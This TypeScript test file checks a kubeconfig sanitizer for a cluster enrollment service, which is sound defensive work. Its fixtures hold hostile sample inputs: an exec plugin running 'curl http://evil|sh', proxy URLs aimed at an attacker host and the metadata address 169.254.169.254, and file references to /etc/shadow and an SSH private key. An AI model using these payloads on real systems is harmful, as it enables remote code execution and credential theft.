import { describe, it, expect } from "bun:test";
import { sanitizeKubeconfig, buildEnrolledCluster, EnrollRequestSchema } from "./enrollment.ts";
import type { EnrollmentTokenRow } from "../lib/state.ts";

const GOOD_KUBECONFIG = [
  "apiVersion: v1",
  "kind: Config",
  "clusters:",
  "  - name: worker",
  "    cluster:",
  "      server: https://10.0.0.5:6443",
  "      certificate-authority-data: TEST_CA_DATA==",
  "users:",
  "  - name: worker",
  "    user:",
  "      token: a-static-bearer-token",
  "contexts:",
  "  - name: worker",
  "    context: { cluster: worker, user: worker }",
  "current-context: worker",
  "",
].join("\n");

const tokenRow = (over: Partial<EnrollmentTokenRow> = {}): EnrollmentTokenRow => ({
  id: 1,
  name: "lab-edge",
  hash_sha256: "h",
  cluster_id: "edge-1",
  cluster_name: "Edge 1",
  default_namespace: "default",
  runtime: "k3s",
  image_load: "remote-pull",
  created_at: "2026-01-01T00:00:00.000Z",
  expires_at: "2026-01-01T00:30:00.000Z",
  used_at: null,
  used_by: null,
  revoked_at: null,
  ...over,
});

describe("sanitizeKubeconfig", () => {
  it("accepts a static-token kubeconfig with an https server + embedded CA", () => {
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG)).toEqual({ ok: true });
  });

  it("rejects empty / non-https / missing-server kubeconfigs", () => {
    expect(sanitizeKubeconfig("").ok).toBe(false);
    expect(sanitizeKubeconfig("kind: Config\n").ok).toBe(false);
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG.replace("https://10.0.0.5", "http://10.0.0.5")).ok).toBe(false);
  });

  it("rejects a missing embedded CA (no endpoint authentication)", () => {
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG.replace(/\s+certificate-authority-data:.*/, "")).ok).toBe(false);
  });

  it("rejects when current-context points at a cluster without embedded CA even if another cluster is valid", () => {
    const decoy = [
      "apiVersion: v1",
      "kind: Config",
      "clusters:",
      "  - name: decoy",
      "    cluster:",
      "      server: https://10.0.0.5:6443",
      "      certificate-authority-data: CA==",
      "  - name: active",
      "    cluster:",
      "      server: https://attacker.example:6443",
      "users:",
      "  - name: worker",
      "    user: { token: a-static-bearer-token }",
      "contexts:",
      "  - name: worker",
      "    context: { cluster: active, user: worker }",
      "current-context: worker",
    ].join("\n");
    expect(sanitizeKubeconfig(decoy).ok).toBe(false);
  });

  it("rejects missing or dangling current-context references", () => {
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG.replace("current-context: worker", "current-context: ghost")).ok).toBe(false);
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG.replace("context: { cluster: worker, user: worker }", "context: { cluster: ghost, user: worker }")).ok).toBe(false);
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG.replace("context: { cluster: worker, user: worker }", "context: { cluster: worker, user: ghost }")).ok).toBe(false);
  });

  it("rejects an exec auth plugin (RCE on the hyper host)", () => {
    const evil = GOOD_KUBECONFIG.replace("      token: a-static-bearer-token", "      exec:\n        command: /bin/evil");
    expect(sanitizeKubeconfig(evil).ok).toBe(false);
  });

  it("rejects auth-provider, proxy-url, and insecure-skip-tls-verify", () => {
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG + "      auth-provider:\n        name: gcp\n").ok).toBe(false);
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG + "    proxy-url: http://attacker:8080\n").ok).toBe(false);
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG + "      insecure-skip-tls-verify: true\n").ok).toBe(false);
  });

  it("rejects external file references (tokenFile / client-key / certificate-authority paths)", () => {
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG + "      tokenFile: /etc/shadow\n").ok).toBe(false);
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG + "      client-key: /root/.ssh/id_rsa\n").ok).toBe(false);
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG + "      certificate-authority: /etc/ca.crt\n").ok).toBe(false);
  });

  it("does NOT confuse embedded -data keys with their file-path variants", () => {
    const withClientCertData = GOOD_KUBECONFIG.replace(
      "      token: a-static-bearer-token",
      "      client-certificate-data: CERT==\n      client-key-data: KEY==",
    );
    expect(sanitizeKubeconfig(withClientCertData)).toEqual({ ok: true });
  });

  it("rejects an oversized payload", () => {
    expect(sanitizeKubeconfig(GOOD_KUBECONFIG + "#".repeat(300_000)).ok).toBe(false);
  });

  it("rejects flow-style (JSON-style) YAML that hides dangerous keys from a line-anchored scan", () => {
    // These are valid kubeconfigs kubectl honours; a substring/line denylist misses them because the
    // dangerous key is preceded by `{` or `,`, not whitespace. The object-graph walk must catch them.
    const execFlow = [
      "apiVersion: v1",
      "kind: Config",
      "clusters: [{ name: w, cluster: { server: https://10.0.0.5:6443, certificate-authority-data: CA== } }]",
      'users: [{ name: w, user: { exec: { command: /bin/sh, args: ["-c", "curl http://evil|sh"] } } }]',
      "contexts: [{ name: w, context: { cluster: w, user: w } }]",
      "current-context: w",
    ].join("\n");
    expect(sanitizeKubeconfig(execFlow).ok).toBe(false);

    const proxyFlow = GOOD_KUBECONFIG.replace(
      "clusters:",
      "clusters:\n  - { name: p, cluster: { server: https://x:6443, certificate-authority-data: CA==, proxy-url: http://169.254.169.254 } }\n  # and:",
    );
    expect(sanitizeKubeconfig(proxyFlow).ok).toBe(false);

    const fileRefFlow = GOOD_KUBECONFIG.replace(
      "users:",
      "users:\n  - { name: f, user: { tokenFile: /etc/shadow } }\n  # and:",
    );
    expect(sanitizeKubeconfig(fileRefFlow).ok).toBe(false);
  });

  it("rejects an insecure-skip-tls-verify cluster in flow style", () => {
    const insecure = [
      "apiVersion: v1",
      "kind: Config",
      "clusters: [{ name: w, cluster: { server: https://10.0.0.5:6443, certificate-authority-data: CA==, insecure-skip-tls-verify: true } }]",
      "users: [{ name: w, user: { token: t } }]",
      "current-context: w",
    ].join("\n");
    expect(sanitizeKubeconfig(insecure).ok).toBe(false);
  });

  it("does not echo malformed kubeconfig contents in parse errors", () => {
    const secret = "a-static-bearer-token";
    const result = sanitizeKubeconfig(`apiVersion: v1\nusers: [${secret}\n`);
    expect(result.ok).toBe(false);
    expect(JSON.stringify(result)).not.toContain(secret);
  });
});

describe("buildEnrolledCluster", () => {
  it("maps the token's declared cluster + forces enrolled provenance", () => {
    const c = buildEnrolledCluster(tokenRow(), "/etc/celeste-hyper/clusters/edge-1.kubeconfig", "2026-02-02T00:00:00.000Z");
    expect(c.id).toBe("edge-1");
    expect(c.name).toBe("Edge 1");
    expect(c.kubeconfigPath).toBe("/etc/celeste-hyper/clusters/edge-1.kubeconfig");
    expect(c.runtime).toBe("k3s");
    expect(c.imageLoad).toBe("remote-pull");
    expect(c.origin).toBe("enrolled");
    expect(c.enrolledAt).toBe("2026-02-02T00:00:00.000Z");
    expect(c.enabled).toBe(true);
  });

  it("lets the worker's reported runtime override the token default", () => {
    const c = buildEnrolledCluster(tokenRow(), "/k/edge-1", "2026-02-02T00:00:00.000Z", "containerd");
    expect(c.runtime).toBe("containerd");
  });
});

describe("EnrollRequestSchema", () => {
  it("requires token + kubeconfig and drops unknown widening fields", () => {
    expect(EnrollRequestSchema.safeParse({}).success).toBe(false);
    const ok = EnrollRequestSchema.safeParse({ token: "che_x", kubeconfig: GOOD_KUBECONFIG, runtime: "k3s", nodeName: "n1" });
    expect(ok.success).toBe(true);
  });
});
